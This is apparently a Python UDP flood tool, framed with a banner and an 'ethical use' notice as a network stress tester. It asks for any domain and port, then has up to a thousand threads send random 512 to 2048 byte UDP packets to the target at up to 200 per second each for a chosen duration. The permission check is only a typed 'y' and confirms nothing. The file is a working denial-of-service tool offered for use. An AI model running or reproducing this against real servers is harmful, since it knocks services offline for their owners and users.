import socket
import threading
import random
import time
import sys
import concurrent.futures
from colorama import Fore, Style, init
import hashlib
import os
import signal

# Initialize colorama
init(autoreset=True)

# Constants
MAX_REQUESTS_PER_SECOND = 200  # Rate limiting: Max requests per bot per second
stop_test = False  # Global flag for stopping the test manually
SCRIPT_HASH = hashlib.sha256(open(__file__, "rb").read()).hexdigest()  # Unique identifier for the script

# Ethical Use Notice
def display_notice():
    banner = r"""
 _        _       _________ ______   _______  _______  _        _______           _______  _______ 
| \    /\( (    /|\__   __/(  ___ \ (  ____ \(  ____ \( \      (  ___  )|\     /|(  ____ \(  ____ \
|  \  / /|  \  ( |   ) (   | (   ) )| (    \/| (    \/| (      | (   ) || )   ( || (    \/| (    \/
|  (_/ / |   \ | |   | |   | (__/ / | (__    | (__    | |      | |   | || |   | || (__    | (__    
|   _ (  | (\ \) |   | |   |  __ (  |  __)   |  __)   | |      | |   | |( (   ) )|  __)   |  __)   
|  ( \ \ | | \   |   | |   | (  \ \ | (      | (      | |      | |   | | \ \_/ / | (      | (      
|  /  \ \| )  \  |___) (___| )___) )| (____/\| (____/\| (____/\| (___) |  \   /  | (____/\| (____/\
|_/    \/|/    )_)\_______/|/ \___/ (_______/(_______/(_______/(_______)   \_/   (_______/(_______/
                                                                                     
    """
    print(Fore.RED + banner)
    color_print("NOTICE: This tool is for ethical and educational purposes only.", Fore.YELLOW)
    color_print("DO NOT use this tool without explicit permission from the server owner.", Fore.YELLOW)
    color_print("Unauthorized use is illegal and may result in severe consequences.", Fore.RED)

# Utility Functions
def color_print(message, color):
    print(f"{color}{message}{Style.RESET_ALL}")

# User Confirmation
def confirm_permission():
    color_print("\nPlease read and confirm the following:", Fore.CYAN)
    color_print("1. You must have explicit permission from the server owner to run this tool.", Fore.YELLOW)
    color_print("2. Unauthorized use is illegal and punishable by law.", Fore.YELLOW)
    color_print("3. This tool is designed for educational and lawful purposes only.", Fore.YELLOW)

    reason = input(Fore.CYAN + "Enter the reason for testing this server: ").strip()
    confirmation = input(Fore.CYAN + "Do you confirm you have permission from the server owner? (y/n): ").strip().lower()

    if confirmation != 'y':
        color_print("Exiting... Ensure you have proper permission before proceeding.", Fore.RED)
        sys.exit(5)

# User Configuration
def get_user_input():
    color_print("\n" + "=" * 60, Fore.CYAN)
    color_print("          Ethical Network Stress Test Configuration", Fore.YELLOW)
    color_print("=" * 60, Fore.CYAN)

    try:
        target_domain = input(Fore.GREEN + "Enter the target server domain (e.g., example.com): ").strip()
        target_ip = socket.gethostbyname(target_domain)

        target_port = int(input(Fore.GREEN + "Enter the target server port (1-65535): ").strip())
        if not 1 <= target_port <= 65535:
            raise ValueError("Port must be in the range 1-65535.")

        num_bots = int(input(Fore.GREEN + "Enter the number of simulated bots (e.g., 10-1000): ").strip())
        if num_bots <= 0:
            raise ValueError("Number of bots must be a positive integer.")

        duration = int(input(Fore.GREEN + "Enter the test duration in seconds: ").strip())
        if duration <= 0:
            raise ValueError("Duration must be a positive integer.")

        return target_ip, target_port, num_bots, duration
    except ValueError as ve:
        color_print(f"Invalid input: {ve}", Fore.RED)
        sys.exit(1)
    except socket.gaierror:
        color_print("Unable to resolve domain. Exiting...", Fore.RED)
        sys.exit(1)

# Generate Random Packet
def generate_packet():
    packet_size = random.randint(512, 2048)
    headers = "X-Ethical-Test: True\n"
    return headers.encode() + os.urandom(packet_size - len(headers))

# Stop Test Monitor
def monitor_stop_condition():
    global stop_test
    try:
        while not stop_test:
            time.sleep(1)
    except KeyboardInterrupt:
        stop_test = True

# Simulate a Single Bot
def simulate_bot(ip, port, duration):
    end_time = time.time() + duration
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
            while time.time() < end_time and not stop_test:
                packet = generate_packet()
                sock.sendto(packet, (ip, port))
                time.sleep(1 / MAX_REQUESTS_PER_SECOND)
    except Exception as e:
        color_print(f"Bot encountered an issue: {e}", Fore.RED)

# Start the Stress Test
def start_stress_test(ip, port, bots, duration):
    global stop_test
    color_print(f"\nStarting stress test...\nTarget: {ip}:{port}\nSimulated Bots: {bots}\nDuration: {duration} seconds\n", Fore.MAGENTA)

    with concurrent.futures.ThreadPoolExecutor(max_workers=bots) as executor:
        futures = [executor.submit(simulate_bot, ip, port, duration) for _ in range(bots)]

        monitor_thread = threading.Thread(target=monitor_stop_condition)
        monitor_thread.start()

        try:
            for future in concurrent.futures.as_completed(futures):
                if stop_test:
                    break
                future.result()
        except KeyboardInterrupt:
            stop_test = True
            color_print("\nTest interrupted by user. Exiting...\n", Fore.YELLOW)

    color_print("Stress test completed successfully.\n", Fore.GREEN)

# Graceful Shutdown on SIGINT
def handle_interrupt(signal, frame):
    global stop_test
    stop_test = True
    color_print("\nTest interrupted. Shutting down...\n", Fore.YELLOW)
    sys.exit(0)

# Register signal handler for graceful shutdown
signal.signal(signal.SIGINT, handle_interrupt)

# Entry Point
if __name__ == "__main__":
    display_notice()
    confirm_permission()
    target_ip, target_port, num_bots, duration = get_user_input()
    start_stress_test(target_ip, target_port, num_bots, duration)
